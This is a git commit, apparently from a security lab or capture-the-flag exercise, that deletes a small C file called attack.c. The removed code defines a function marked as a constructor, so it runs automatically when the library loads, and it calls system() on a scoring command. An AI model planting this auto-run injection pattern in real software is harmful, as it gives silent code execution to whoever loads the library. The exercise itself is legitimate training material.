e6a3b1115656c1303a1b7244ebd4fa2bdd246efe
zonkism <zonkism@gmail.com>
2020-11-13 16:59:26 -0600

    Delete attack.c

--- attack.c
+++
@@ -1,8 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 422acb85-639c-43db-b448-fccf64ece96f");
-}
